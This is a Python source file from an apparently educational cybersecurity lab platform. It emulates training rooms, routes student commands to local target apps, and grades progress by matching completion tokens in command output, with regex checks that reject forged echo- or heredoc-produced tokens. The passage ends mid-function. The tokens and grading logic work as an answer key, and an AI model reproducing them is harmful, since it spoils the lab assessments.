"""
Process-based Local Lab Runner for NO ENTRY Academy.
Provides high-fidelity practical lab interaction when Docker daemon is not available.
Translates commands into authentic responses, files, and queries.
"""

import asyncio
import os
import re
import shlex
import sys
import threading
import time
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional
import httpx

from backend.app.labs.base import (
    LabRunner,
    LabSessionInfo,
    generate_trusted_session_signature,
)
from labs.red_room_09_sqli.target.app import (
    access_app,
    ad_app,
    auth_app,
    bruteforce_app,
    capstone_app,
    cmd_app,
    endpoint_app,
    enum_app,
    exploit_app,
    foundations_app,
    init_target_db,
    linux_monitoring_app,
    log_analysis_app,
    malware_analysis_app,
    network_app,
    password_app,
    phishing_app,
    privesc_app,
    recon_app,
    scanning_app,
    siem_lab_app,
    soc_app,
    target_app,
    traffic_app,
    traversal_app,
    upload_app,
    vuln_app,
    webapp_app,
    win_event_app,
    win_security_app,
    wireshark_lab_app,
    xss_app,
    get_soc_state,
    get_win_state,
    get_linux_state,
    get_traffic_state,
    get_wireshark_state,
    get_log_state,
    get_siem_state,
    get_win_event_state,
    get_bruteforce_state,
    get_malware_state,
    get_phishing_state,
    get_endpoint_state,
    get_nids_state,
    get_hunt_state,
    get_triage_state,
    get_response_state,
    get_forensics_state,
    get_hardening_state,
    get_intel_state,
    get_blue_capstone_state,
    get_purple_foundations_state,
    get_purple_attck_state,
    get_purple_simulation_state,
    get_purple_recon_state,
    get_purple_privesc_state,
    get_purple_injection_state,
    get_purple_lateral_state,
    get_purple_persist_state,
    get_purple_c2_state,
    get_purple_exfil_state,
    get_purple_ransomware_state,
    get_purple_cloud_state,
    get_purple_supply_chain_state,
    get_purple_api_abuse_state,
    get_purple_ad_attacks_state,
    get_purple_cicd_state,
    get_purple_edr_bypass_state,
    get_purple_heatmap_state,
    get_purple_continuous_validation_state,
    get_purple_capstone_state,
    get_detection_foundations_state,
    get_detection_normalization_state,
    get_detection_sigma_syntax_state,
    get_detection_process_creation_state,
    get_detection_network_rules_state,
    get_detection_file_registry_state,
    get_detection_auth_abuse_state,
    get_detection_powershell_state,
    get_detection_web_rules_state,
    get_detection_modsec_state,
    get_detection_wazuh_state,
    get_detection_false_positive_state,
    get_detection_threshold_state,
    get_detection_correlation_state,
    get_detection_unit_testing_state,
    get_detection_yara_hunting_state,
    get_detection_suricata_state,
    get_detection_hunt_hypothesis_state,
    get_detection_pipeline_state,
    get_detection_capstone_state,
    reset_target_in_memory_states,
    nids_app,
    threat_hunt_app,
    triage_app,
    incident_response_app,
    forensics_app,
    hardening_app,
    threat_intel_app,
    blue_capstone_app,
    purple_foundations_app,
    purple_attck_app,
    purple_simulation_app,
    purple_recon_app,
    purple_privesc_app,
    purple_injection_app,
    purple_lateral_app,
    purple_persist_app,
    purple_c2_app,
    purple_exfil_app,
    purple_ransomware_app,
    purple_cloud_app,
    purple_supply_chain_app,
    purple_api_abuse_app,
    purple_ad_attacks_app,
    purple_cicd_pipeline_app,
    purple_edr_bypass_app,
    purple_heatmap_app,
    purple_continuous_val_app,
    purple_capstone_app,
    detection_foundations_app,
    detection_normalization_app,
    detection_sigma_syntax_app,
    detection_process_creation_app,
    detection_network_rules_app,
    detection_file_registry_app,
    detection_auth_abuse_app,
    detection_powershell_app,
    detection_web_rules_app,
    detection_modsec_app,
    detection_wazuh_app,
    detection_false_positive_app,
    detection_threshold_app,
    detection_correlation_app,
    detection_unit_testing_app,
    detection_yara_hunting_app,
    detection_suricata_app,
    detection_hunt_hypothesis_app,
    detection_pipeline_app,
    detection_capstone_app,
)


class ProcessLabRunner(LabRunner):
    """
    Spins up the target application directly on loopback and routes
    simulated command-line interactions (curl, python3, whoami, etc.) against it.
    """

    def __init__(self):
        self._active_sessions: Dict[str, LabSessionInfo] = {}

    def is_available(self) -> bool:
        """Process runner is always available locally."""
        return True

    async def start_session(
        self, session_id: str, room_id: str, operator_id: str
    ) -> LabSessionInfo:
        # Check if already running
        if session_id in self._active_sessions:
            return self._active_sessions[session_id]

        port_map = {
            "red-01-cybersecurity-foundations": 8081,
            "red-01-foundations": 8081,
            "red-01-linux-essentials": 8081,
            "red-02-linux-for-hackers": 8089,
            "red-02-network-recon": 8089,
            "red-03-networking-fundamentals": 8080,
            "red-03-web-recon": 8080,
            "red-04-reconnaissance": 8090,
            "red-04-vuln-scanning": 8090,
            "red-05-network-scanning": 8085,
            "red-05-auth-attacks": 8085,
            "red-06-service-enumeration": 8086,
            "red-06-hash-cracking": 8086,
            "red-07-vulnerability-assessment": 8087,
            "red-07-proxy-burp": 8087,
            "red-08-web-application-fundamentals": 8088,
            "red-08-lfi-rfi": 8088,
            "red-09-sqli-fundamentals": 8089,
            "red-10-cross-site-scripting": 8091,
            "red-10-xss-basics": 8091,
            "red-11-authentication-attacks": 8092,
            "red-11-auth-attacks": 8092,
            "red-12-access-control-testing": 8093,
            "red-12-access-control": 8093,
            "red-13-file-upload-vulnerabilities": 8094,
            "red-13-file-upload": 8094,
            "red-14-command-injection": 8095,
            "red-14": 8095,
            "red-14-linux-privesc-suid": 8095,
            "red-15-directory-traversal": 8096,
            "red-15": 8096,
            "red-15-linux-privesc-cron": 8096,
            "red-16-password-security": 8097,
            "red-16": 8097,
            "red-16-win-recon": 8097,
            "red-17-privilege-escalation": 8098,
            "red-17": 8098,
            "red-17-win-privesc": 8098,
            "red-18-active-directory-fundamentals": 8099,
            "red-18": 8099,
            "red-18-ad-enum": 8099,
            "red-19-exploitation-post-exploitation": 8100,
            "red-19": 8100,
            "red-19-ad-kerberoast": 8100,
            "red-20-red-team-capstone": 8101,
            "red-20": 8101,
            "red-20-capstone": 8101,
            # Blue Team Rooms 01-08
            "blue-01-blue-team-foundations": 8201,
            "blue-01": 8201,
            "blue-01-soc-fundamentals": 8201,
            "blue-02-windows-security-fundamentals": 8202,
            "blue-02": 8202,
            "blue-02-windows-event-logs": 8202,
            "blue-03-linux-security-monitoring": 8203,
            "blue-03": 8203,
            "blue-03-linux-log-analysis": 8203,
            "blue-04-network-traffic-analysis": 8204,
            "blue-04": 8204,
            "blue-04-traffic-analysis": 8204,
            "blue-05-wireshark-fundamentals": 8205,
            "blue-05": 8205,
            "blue-05-wireshark-packets": 8205,
            "blue-06-log-analysis-fundamentals": 8206,
            "blue-06": 8206,
            "blue-06-log-analysis": 8206,
            "blue-07-siem-fundamentals": 8207,
            "blue-07": 8207,
            "blue-07-siem-splunk-elk": 8207,
            "blue-08-windows-event-investigation": 8208,
            "blue-08": 8208,
            "blue-08-windows-event-logs": 8208,
            # Blue Team Rooms 09-12
            "blue-09-bruteforce-detection": 8209,
            "blue-09": 8209,
            "blue-09-bruteforce": 8209,
            "blue-10-malware-behaviour-analysis": 8210,
            "blue-10": 8210,
            "blue-10-malware": 8210,
            "blue-10-malware-analysis": 8210,
            "blue-11-phishing-investigation": 8211,
            "blue-11": 8211,
            "blue-11-phishing": 8211,
            "blue-12-endpoint-detection": 8212,
            "blue-12": 8212,
            "blue-12-endpoint": 8212,
            # Blue Team Rooms 13-16
            "blue-13-network-intrusion-detection": 8213,
            "blue-13": 8213,
            "blue-13-nids": 8213,
            "blue-14-threat-hunting": 8214,
            "blue-14": 8214,
            "blue-14-hunting": 8214,
            "blue-15-incident-triage": 8215,
            "blue-15": 8215,
            "blue-15-triage": 8215,
            "blue-16-incident-response": 8216,
            "blue-16": 8216,
            "blue-16-ir": 8216,
            # Blue Team Rooms 17-20
            "blue-17-digital-forensics": 8217,
            "blue-17": 8217,
            "blue-17-forensics": 8217,
            "blue-18-windows-linux-hardening": 8218,
            "blue-18": 8218,
            "blue-18-hardening": 8218,
            "blue-19-threat-intelligence": 8219,
            "blue-19": 8219,
            "blue-19-intel": 8219,
            "blue-19-threat-intel": 8219,
            "blue-20-blue-team-capstone": 8220,
            "blue-20": 8220,
            "blue-20-capstone": 8220,
            # Purple Team Rooms 01-04
            "purple-01-purple-team-foundations": 8301,
            "purple-01": 8301,
            "purple-01-foundations": 8301,
            "purple-02-mitre-attack-fundamentals": 8302,
            "purple-02": 8302,
            "purple-02-attck": 8302,
            "purple-03-attack-simulation-planning": 8303,
            "purple-03": 8303,
            "purple-03-simulation": 8303,
            "purple-04-reconnaissance-vs-monitoring": 8304,
            "purple-04": 8304,
            "purple-04-recon-monitoring": 8304,
            # Purple Team Rooms 05-08
            "purple-05-privesc-emulation": 8305,
            "purple-05": 8305,
            "purple-05-privesc": 8305,
            "purple-06-defense-evasion-emulation": 8306,
            "purple-06": 8306,
            "purple-06-defense-evasion": 8306,
            "purple-07-lateral-movement-emulation": 8307,
            "purple-07": 8307,
            "purple-07-lateral-movement": 8307,
            "purple-08-persistence-emulation": 8308,
            "purple-08": 8308,
            "purple-08-persistence": 8308,
            # Purple Team Rooms 09-12
            "purple-09-c2-framework-emulation": 8309,
            "purple-09": 8309,
            "purple-09-c2": 8309,
            "purple-10-exfiltration-emulation": 8310,
            "purple-10": 8310,
            "purple-10-exfil": 8310,
            "purple-11-ransomware-readiness": 8311,
            "purple-11": 8311,
            "purple-11-ransomware": 8311,
            "purple-12-cloud-identity-emulation": 8312,
            "purple-12": 8312,
            "purple-12-cloud-identity": 8312,
            # Purple Team Rooms 13-16
            "purple-13-supply-chain-emulation": 8313,
            "purple-13": 8313,
            "purple-13-supply-chain": 8313,
            "purple-14-api-abuse-emulation": 8314,
            "purple-14": 8314,
            "purple-14-api-abuse": 8314,
            "purple-14-bola": 8314,
            "purple-15-active-directory-attacks-emulation": 8315,
            "purple-15": 8315,
            "purple-15-ad-attacks": 8315,
            "purple-15-kerberoasting": 8315,
            "purple-16-ci-cd-pipeline-emulation": 8316,
            "purple-16": 8316,
            "purple-16-cicd": 8316,
            "purple-16-ci-cd": 8316,
            "purple-17-edr-telemetry-blinding-and-bypass-emulation": 8317,
            "purple-17-edr-bypass-emulation": 8317,
            "purple-17": 8317,
            "purple-17-edr-bypass": 8317,
            "purple-17-edr": 8317,
            "purple-18-ttp-heatmap-generation-and-coverage-scoring": 8318,
            "purple-18-ttp-heatmap-generation": 8318,
            "purple-18": 8318,
            "purple-18-heatmap": 8318,
            "purple-19-continuous-security-validation-and-automated-testing": 8319,
            "purple-19-continuous-security-validation": 8319,
            "purple-19": 8319,
            "purple-19-continuous-validation": 8319,
            "purple-20-purple-team-capstone-full-adversary-emulation-exercise": 8320,
            "purple-20-capstone-purple-exercise": 8320,
            "purple-20": 8320,
            "purple-20-capstone": 8320,
            # Detection Engineering Rooms 01-04
            "detect-01-foundations-as-code": 8401,
            "detect-01-detection-engineering-foundations-and-detection-as-code": 8401,
            "detect-01": 8401,
            "detect-01-foundations": 8401,
            "detect-02-log-normalization-and-taxonomy-ecs-and-cim": 8402,
            "detect-02-log-normalization": 8402,
            "detect-02": 8402,
            "detect-02-normalization": 8402,
            "detect-03-sigma-rule-syntax-and-component-structure": 8403,
            "detect-03-sigma-syntax": 8403,
            "detect-03": 8403,
            "detect-03-sigma": 8403,
            "detect-04-writing-process-creation-rules-sysmon-event-id-1": 8404,
            "detect-04-process-creation-rules": 8404,
            "detect-04": 8404,
            "detect-04-process-creation": 8404,
            # Detection Engineering Rooms 05-08
            "detect-05-writing-network-connection-rules-sysmon-event-id-3": 8405,
            "detect-05-network-connection-rules": 8405,
            "detect-05": 8405,
            "detect-05-network": 8405,
            "detect-06-writing-file-and-registry-integrity-rules": 8406,
            "detect-06-file-registry-rules": 8406,
            "detect-06": 8406,
            "detect-06-file-registry": 8406,
            "detect-07-detecting-authentication-abuse-event-ids-4624-4625-4672": 8407,
            "detect-07-auth-abuse-rules": 8407,
            "detect-07": 8407,
            "detect-07-auth-abuse": 8407,
            "detect-08-detecting-powershell-obfuscation-and-download-cradles": 8408,
            "detect-08-powershell-obfuscation": 8408,
            "detect-08": 8408,
            "detect-08-powershell": 8408,
            # Detection Engineering Rooms 09-12
            "detect-09-web-detection-rules": 8409,
            "detect-09-writing-web-application-detection-rules-sqli-xss-lfi": 8409,
            "detect-09": 8409,
            "detect-09-web-rules": 8409,
            "detect-10-modsec-crs-tuning": 8410,
            "detect-10-modsecurity-core-rule-set-tuning-and-custom-rules": 8410,
            "detect-10": 8410,
            "detect-10-modsec": 8410,
            "detect-11-wazuh-decoders-rules": 8411,
            "detect-11-wazuh-ossec-rules-and-decoders": 8411,
            "detect-11": 8411,
            "detect-11-wazuh": 8411,
            "detect-12-reducing-false-positives": 8412,
            "detect-12-tuning-detections-and-reducing-false-positives": 8412,
            "detect-12": 8412,
            "detect-12-tuning": 8412,
            # Detection Engineering Rooms 13-16
            "detect-13-threshold-detections": 8413,
            "detect-13-baseline-profiling-and-threshold-based-detections": 8413,
            "detect-13": 8413,
            "detect-13-threshold": 8413,
            "detect-14-correlation-rules": 8414,
            "detect-14-correlation-rules-multi-event-detection": 8414,
            "detect-14": 8414,
            "detect-14-correlation": 8414,
            "detect-15-unit-testing-rules": 8415,
            "detect-15-detection-testing-with-unit-tests-and-synthetic-logs": 8415,
            "detect-15": 8415,
            "detect-15-unit-testing": 8415,
            "detect-16-yara-hunting": 8416,
            "detect-16-yara-rules-for-file-and-memory-threat-hunting": 8416,
            "detect-16": 8416,
            "detect-16-yara": 8416,
            # Detection Engineering Rooms 17-20
            "detect-17-snort-suricata": 8417,
            "detect-17": 8417,
            "detect-17-suricata": 8417,
            "detect-17-snort": 8417,
            "detect-18-threat-hunting-hypothesis": 8418,
            "detect-18": 8418,
            "detect-18-threat-hunting": 8418,
            "detect-19-ci-cd-detection-pipelines": 8419,
            "detect-19": 8419,
            "detect-19-cicd": 8419,
            "detect-19-ci-cd": 8419,
            "detect-20-capstone-detection-pipeline": 8420,
            "detect-20": 8420,
            "detect-20-capstone": 8420,
        }
        target_port = port_map.get(room_id, 8089)

        # Initialize clean database
        init_target_db()

        octet = 14
        if "blue" in room_id:
            octet = 15
        elif "purple" in room_id:
            octet = 16
        elif "detect" in room_id:
            octet = 17
        target_ip = f"10.10.{octet}.90"
        attacker_ip = f"10.10.{octet}.10"
        open_ports = [22, 80, 443, target_port]

        info = LabSessionInfo(
            session_id=session_id,
            room_id=room_id,
            operator_id=operator_id,
            runner_mode="emulated",
            docker_available=False,
            status="RUNNING",
            target_url=f"http://127.0.0.1:{target_port}",
            target_ip=target_ip,
            target_port=target_port,
            target_hostname="target",
            attacker_ip=attacker_ip,
            attacker_hostname="attacker",
            open_ports=open_ports,
            active_sessions_count=1,
            created_at=datetime.utcnow(),
            expires_at=datetime.utcnow() + timedelta(minutes=60),
        )
        self._active_sessions[session_id] = info
        return info

    async def stop_session(self, session_id: str) -> bool:
        info = self._active_sessions.pop(session_id, None)
        if info:
            info.status = "STOPPED"
        reset_target_in_memory_states(session_id)
        return info is not None

    async def reset_session(self, session_id: str) -> LabSessionInfo:
        info = self._active_sessions.get(session_id)
        if not info:
            raise KeyError(f"Session {session_id} not found.")

        # Re-seed clean SQLite database
        init_target_db()
        return info

    async def execute_command(self, session_id: str, command: str) -> str:
        info = self._active_sessions.get(session_id)
        if not info:
            return "[-] Error: Active lab session not found or expired. Click 'Start Lab' to reconnect."
        out = await self._eval_command(info, command)
        # Verify execution result was successful before recording actions
        if not (
            out.startswith("[-] Error")
            or out.startswith("curl: (")
            or "No such file or directory" in out
            or "Command not found" in out
            or "Permission denied" in out
        ):
            self._record_command_actions(info, command, out)
        return out

    @staticmethod
    def _is_forged_command(command: str) -> bool:
        cmd = command.strip().lower()
        if re.search(r"(^|[;&|`$()])\s*(echo|printf)\s+", cmd):
            return True
        if re.search(r"python[23]?\s+-c\s+.*(print|stdout\.write)", cmd):
            return True
        if re.search(r"cat\s*<<\s*['\"]?eof['\"]?", cmd):
            return True
        if re.search(r"<\(\s*(echo|printf)", cmd):
            return True
        if cmd.startswith("alias "):
            return True
        return False

    def _record_command_actions(self, info: LabSessionInfo, command: str, output: str) -> None:
        if not info:
            return
        if self._is_forged_command(command):
            return

        # Ensure command is actually invoking a legitimate HTTP client, shell tool, or script
        has_client = any(
            tool in command.lower()
            for tool in [
                "curl", "wget", "python", "tshark", "tcpdump", "edr_query",
                "yara_scanner", "detect_bruteforce", "inspect_email", "soc_query", "parse_evtx",
                "inspect_nids", "hunt_query", "triage_tool", "ir_manager",
                "forensics_tool", "hardening_audit", "intel_tool", "capstone_investigator", "sha256sum",
                "purple_foundations_tool", "attck_mapping_tool", "simulation_planner", "recon_correlator", "nmap",
                "privesc_emulation_tool", "injection_emulation_tool", "lateral_emulation_tool", "persistence_emulation_tool",
                "c2_emulation_tool", "exfil_emulation_tool", "ransomware_emulation_tool", "cloud_iam_emulation_tool",
                "supply_chain_tool", "api_abuse_tool", "ad_attacks_tool", "cicd_pipeline_tool",
                "edr_bypass_tool", "heatmap_tool", "continuous_validation_tool", "purple_capstone_tool",
                "detection_foundations_tool", "log_normalization_tool", "sigma_syntax_tool", "process_creation_tool",
                "network_connection_tool", "file_registry_tool", "auth_abuse_tool", "powershell_obfuscation_tool",
                "web_detection_tool", "modsec_tuning_tool", "wazuh_decoders_tool", "false_positive_tool",
                "threshold_tool", "correlation_rule_tool", "detection_testing_tool", "yara_hunting_tool",
                "suricata_tool", "threat_hunting_tool", "pipeline_tool", "capstone_pipeline_tool"
            ]
        )
        if not has_client:
            return

        # Blue Team Room 01
        if "TRIAGE_CONFIRMED_EVT1003_SECURE" in output:
            if get_soc_state(info.session_id).get("triaged_events"):
                info.record_action("soc_triage_verified")
        if "TIMELINE_RECONSTRUCTED_DC_VOLT01" in output:
            if get_soc_state(info.session_id).get("timeline_verified"):
                info.record_action("soc_timeline_verified")
        if "CONTAINMENT_ENFORCED_IP_BLOCKED" in output:
            if get_soc_state(info.session_id).get("remediated"):
                info.record_action("soc_remediation_verified")
        # Blue Team Room 02
        if "SEDEBUG_PRIVILEGE_AUDITED_CONFIRMED" in output:
            if get_win_state(info.session_id).get("privilege_audited"):
                info.record_action("win_privilege_audited")
        if "LOCKOUT_POLICY_ENFORCED_5_ATTEMPTS" in output:
            if get_win_state(info.session_id).get("lockout_policy_enforced"):
                info.record_action("win_audit_remediation_verified")
        # Blue Team Room 03
        if "ATTRIBUTION_CONFIRMED_192_0_2_144" in output:
            if get_linux_state(info.session_id).get("attribution_verified"):
                info.record_action("linux_attribution_verified")
        if "SSHD_HARDENED_FAIL2BAN_ENABLED" in output:
            if get_linux_state(info.session_id).get("remediated"):
                info.record_action("linux_incident_verified")
        # Blue Team Room 04
        if "COVERT_CHANNEL_EXFIL_IDENTIFIED" in output:
            info.record_action("traffic_investigation_verified")
        if "TLS_ENFORCED_DNS_SINKHOLED" in output:
            if get_traffic_state(info.session_id).get("remediated"):
                info.record_action("traffic_remediation_verified")
        # Blue Team Room 05
        if "WIRESHARK_DISPLAY_FILTER_VALIDATED" in output:
            if get_wireshark_state(info.session_id).get("filter_verified"):
                info.record_action("wireshark_challenge_verified")
        # Blue Team Room 06
        if "LOG_TRIAGE_INCIDENT_CORRELATED_SECURE" in output:
            if get_log_state(info.session_id).get("correlated"):
                info.record_action("log_analysis_challenge_verified")
        # Blue Team Room 07
        if "SIEM_CUSTOM_DETECTION_RULE_ACTIVE" in output:
            if len(get_siem_state(info.session_id).get("custom_rules", [])) > 0:
                info.record_action("siem_rule_deployed")
        if "SIEM_TRIAGE_PRIORITIZATION_VALIDATED" in output:
            if get_siem_state(info.session_id).get("incident_prioritized"):
                info.record_action("siem_challenge_verified")
        # Blue Team Room 08
        if "WIN_EVENT_CHAIN_RECONSTRUCTED_CONFIRMED" in output:
            if get_win_event_state(info.session_id).get("investigated"):
                info.record_action("win_event_challenge_verified")
        # Blue Team Room 09
        if "SIEM_SPRAY_CORRELATION_RULE_ACTIVE" in output:
            if get_bruteforce_state(info.session_id).get("rule_deployed"):
                info.record_action("bruteforce_rule_deployed")
        if "BRUTEFORCE_RULE_VERIFIED" in output:
            if get_bruteforce_state(info.session_id).get("campaign_verified"):
                info.record_action("bruteforce_challenge_verified")
        # Blue Team Room 10
        if "YARA_SYNTAX_COMPILED_MATCHED" in output:
            if get_malware_state(info.session_id).get("yara_deployed"):
                info.record_action("malware_yara_validated")
        if "MALWARE_YARA_MATCH_VERIFIED" in output:
            if get_malware_state(info.session_id).get("sample_triaged"):
                info.record_action("malware_challenge_verified")
        # Blue Team Room 11
        if "PHISHING_TRIAGE_VERIFIED_V0LTCORP" in output:
            if get_phishing_state(info.session_id).get("triage_accepted"):
                info.record_action("phishing_triage_verified")
        if "PHISHING_INCIDENT_CONTAINED" in output:
            if get_phishing_state(info.session_id).get("domain_quarantined"):
                info.record_action("phishing_challenge_verified")
        # Blue Team Room 12
        if "EDR_LOLBIN_RULE_ACTIVE_CONFIRMED" in output:
            if get_endpoint_state(info.session_id).get("rule_deployed"):
                info.record_action("endpoint_rule_deployed")
        if "EDR_CONTAINMENT_VERIFIED" in output:
            if get_endpoint_state(info.session_id).get("host_isolated"):
                info.record_action("endpoint_challenge_verified")
        # Blue Team Room 13
        if "NIDS_SNORT_RULE_ACTIVE" in output:
            if get_nids_state(info.session_id).get("rule_deployed"):
                info.record_action("nids_rule_deployed")
        if "NIDS_INTRUSION_DETECTED" in output:
            if get_nids_state(info.session_id).get("intrusion_verified"):
                info.record_action("nids_challenge_verified")
        # Blue Team Room 14
        if "HUNT_SIGMA_QUERY_ACTIVE" in output:
            if get_hunt_state(info.session_id).get("query_deployed"):
                info.record_action("hunt_query_deployed")
        if "THREAT_HUNT_HYPOTHESIS_CONFIRMED" in output:
            if get_hunt_state(info.session_id).get("hunt_verified"):
                info.record_action("hunt_challenge_verified")
        # Blue Team Room 15
        if "TRIAGE_ALERT_CLASSIFIED_CRITICAL" in output:
            if get_triage_state(info.session_id).get("classified"):
                info.record_action("triage_alert_classified")
        if "INCIDENT_TRIAGE_ESCALATION_VALIDATED" in output:
            if get_triage_state(info.session_id).get("triage_verified"):
                info.record_action("triage_challenge_verified")
        # Blue Team Room 16
        if "RESPONSE_CONTAINMENT_ENFORCED" in output:
            if get_response_state(info.session_id).get("contained"):
                info.record_action("response_containment_enforced")
        if "RESPONSE_ERADICATION_COMPLETE" in output:
            if get_response_state(info.session_id).get("eradicated"):
                info.record_action("response_eradication_complete")
        if "INCIDENT_RESPONSE_LIFECYCLE_VERIFIED" in output:
            if get_response_state(info.session_id).get("lifecycle_verified"):
                info.record_action("response_challenge_verified")
        # Blue Team Room 17
        if "FORENSICS_TIMELINE_CONFIRMED" in output:
            if get_forensics_state(info.session_id).get("timeline_verified"):
                info.record_action("forensics_timeline_confirmed")
        if "DIGITAL_FORENSICS_INVESTIGATION_COMPLETE" in output:
            if get_forensics_state(info.session_id).get("case_verified"):
                info.record_action("forensics_challenge_verified")
        # Blue Team Room 18
        if "LINUX_HARDENING_ENFORCED" in output:
            if get_hardening_state(info.session_id).get("linux_remediated"):
                info.record_action("linux_hardening_enforced")
        if "SYSTEM_HARDENING_BASELINE_VERIFIED" in output:
            if get_hardening_state(info.session_id).get("hardening_verified"):
                info.record_action("hardening_challenge_verified")
        # Blue Team Room 19
        if "INTEL_CORRELATION_CONFIRMED" in output:
            if get_intel_state(info.session_id).get("correlated"):
                info.record_action("intel_correlation_confirmed")
        if "THREAT_INTEL_ASSESSMENT_DELIVERED" in output:
            if get_intel_state(info.session_id).get("intel_verified"):
                info.record_action("intel_challenge_verified")
        # Blue Team Room 20
        if "CAPSTONE_STAGE1_DETECT_OK" in output:
            if get_blue_capstone_state(info.session_id).get("detect_verified"):
                info.record_action("capstone_stage1_verified")
        if "CAPSTONE_STAGE3_HUNT_OK" in output:
            if get_blue_capstone_state(info.session_id).get("hunt_verified"):
                info.record_action("capstone_stage2_verified")
        if "CAPSTONE_STAGE4_FORENSICS_OK" in output:
            if get_blue_capstone_state(info.session_id).get("forensics_verified"):
                info.record_action("capstone_stage3_verified")
        if "CAPSTONE_STAGE6_TRIAGE_OK" in output:
            if get_blue_capstone_state(info.session_id).get("triage_verified"):
                info.record_action("capstone_stage4_verified")
        if "CAPSTONE_STAGE7_CONTAIN_OK" in output:
            if get_blue_capstone_state(info.session_id).get("contain_verified"):
                info.record_action("capstone_stage5_verified")
        if "BLUE_TEAM_CAPSTONE_TRIUMPH" in output:
            if get_blue_capstone_state(info.session_id).get("capstone_complete"):
                info.record_action("capstone_final_verified")
        # Purple Team Room 01
        if "PURPLE_TELEMETRY_MAP_VERIFIED" in output:
            if get_purple_foundations_state(info.session_id).get("telemetry_mapped"):
                info.record_action("purple_telemetry_mapped")
        if "PURPLE_FOUNDATIONS_EXERCISE_APPROVED" in output:
            if get_purple_foundations_state(info.session_id).get("foundations_verified"):
                info.record_action("purple_foundations_approved")
        # Purple Team Room 02
        if "ATTCK_EVIDENCE_MAPPING_VERIFIED" in output:
            if get_purple_attck_state(info.session_id).get("evidence_mapped"):
                info.record_action("attck_evidence_mapped")
        if "ATTCK_LIFECYCLE_MAPPING_COMPLETE" in output:
            if get_purple_attck_state(info.session_id).get("attck_verified"):
                info.record_action("attck_lifecycle_complete")
        # Purple Team Room 03
        if "SIMULATION_STEP_REGISTERED" in output:
            if get_purple_simulation_state(info.session_id).get("step_registered"):
                info.record_action("simulation_step_registered")
        if "ATTACK_SIMULATION_PLAN_APPROVED" in output:
            if get_purple_simulation_state(info.session_id).get("simulation_approved"):
                info.record_action("simulation_plan_approved")
        # Purple Team Room 04
        if "RECON_MONITORING_CORRELATION_CONFIRMED" in output:
            if get_purple_recon_state(info.session_id).get("correlation_confirmed"):
                info.record_action("recon_correlation_confirmed")
        if "RECON_VS_MONITORING_VALIDATED" in output:
            if get_purple_recon_state(info.session_id).get("recon_validated"):
                info.record_action("recon_monitoring_validated")
        # Purple Team Room 05
        if "PRIVESC_EMULATION_VERIFIED" in output:
            if get_purple_privesc_state(info.session_id).get("uac_emulated"):
                info.record_action("privesc_emulated")
        if "PRIVESC_DETECTION_VALIDATED" in output:
            if get_purple_privesc_state(info.session_id).get("privesc_validated"):
                info.record_action("privesc_detection_validated")
        # Purple Team Room 06
        if "INJECTION_EMULATION_VERIFIED" in output:
            if get_purple_injection_state(info.session_id).get("injection_emulated"):
                info.record_action("injection_emulated")
        if "DEFENSE_EVASION_DETECTION_VALIDATED" in output:
            if get_purple_injection_state(info.session_id).get("defense_evasion_validated"):
                info.record_action("defense_evasion_detection_validated")
        # Purple Team Room 07
        if "LATERAL_EMULATION_VERIFIED" in output:
            if get_purple_lateral_state(info.session_id).get("lateral_emulated"):
                info.record_action("lateral_emulated")
        if "LATERAL_MOVEMENT_DETECTION_VALIDATED" in output:
            if get_purple_lateral_state(info.session_id).get("lateral_validated"):
                info.record_action("lateral_movement_detection_validated")
        # Purple Team Room 08
        if "PERSISTENCE_EMULATION_VERIFIED" in output:
            if get_purple_persist_state(info.session_id).get("persistence_emulated"):
                info.record_action("persistence_emulated")
        if "PERSISTENCE_REMEDIATION_VALIDATED" in output:
            if get_purple_persist_state(info.session_id).get("persistence_validated"):
                info.record_action("persistence_remediation_validated")
        # Purple Team Room 09
        if "C2_BEACON_EMULATION_VERIFIED" in output:
            if get_purple_c2_state(info.session_id).get("c2_emulated"):
                info.record_action("c2_beacon_emulated")
        if "C2_DETECTION_VALIDATED" in output:
            if get_purple_c2_state(info.session_id).get("c2_validated"):
                info.record_action("c2_detection_validated")
        # Purple Team Room 10
        if "EXFILTRATION_EMULATION_VERIFIED" in output:
            if get_purple_exfil_state(info.session_id).get("exfil_emulated"):
                info.record_action("exfil_emulated")
        if "EXFILTRATION_DETECTION_VALIDATED" in output:
            if get_purple_exfil_state(info.session_id).get("exfil_validated"):
                info.record_action("exfil_detection_validated")
        # Purple Team Room 11
        if "RANSOMWARE_EMULATION_VERIFIED" in output:
            if get_purple_ransomware_state(info.session_id).get("ransomware_emulated"):
                info.record_action("ransomware_emulated")
        if "RANSOMWARE_READINESS_VALIDATED" in output:
            if get_purple_ransomware_state(info.session_id).get("ransomware_validated"):
                info.record_action("ransomware_readiness_validated")
        # Purple Team Room 12
        if "CLOUD_IAM_EMULATION_VERIFIED" in output:
            if get_purple_cloud_state(info.session_id).get("cloud_iam_emulated"):
                info.record_action("cloud_iam_emulated")
        if "CLOUD_IDENTITY_DETECTION_VALIDATED" in output:
            if get_purple_cloud_state(info.session_id).get("cloud_validated"):
                info.record_action("cloud_identity_detection_validated")
        # Purple Team Room 13
        if "SUPPLY_CHAIN_EMULATION_VERIFIED" in output:
            if get_purple_supply_chain_state(info.session_id).get("confusion_emulated"):
                info.record_action("supply_chain_emulated")
        if "SUPPLY_CHAIN_DETECTION_VALIDATED" in output:
            if get_purple_supply_chain_state(info.session_id).get("supply_chain_validated"):
                info.record_action("supply_chain_detection_validated")
        # Purple Team Room 14
        if "BOLA_EMULATION_VERIFIED" in output:
            if get_purple_api_abuse_state(info.session_id).get("bola_emulated"):
                info.record_action("bola_emulated")
        if "API_ABUSE_DETECTION_VALIDATED" in output:
            if get_purple_api_abuse_state(info.session_id).get("api_abuse_validated"):
                info.record_action("api_abuse_detection_validated")
        # Purple Team Room 15
        if "KERBEROASTING_EMULATION_VERIFIED" in output:
            if get_purple_ad_attacks_state(info.session_id).get("kerberoast_emulated"):
                info.record_action("kerberoasting_emulated")
        if "AD_ATTACK_DETECTION_VALIDATED" in output:
            if get_purple_ad_attacks_state(info.session_id).get("ad_attack_validated"):
                info.record_action("ad_attack_detection_validated")
        # Purple Team Room 16
        if "CICD_PIPELINE_EMULATION_VERIFIED" in output:
            if get_purple_cicd_state(info.session_id).get("pipeline_emulated"):
                info.record_action("cicd_pipeline_emulated")
        if "CICD_PIPELINE_DETECTION_VALIDATED" in output:
            if get_purple_cicd_state(info.session_id).get("cicd_validated"):
                info.record_action("cicd_pipeline_detection_validated")
        # Purple Team Room 17
        if "EDR_BYPASS_EMULATION_VERIFIED" in output:
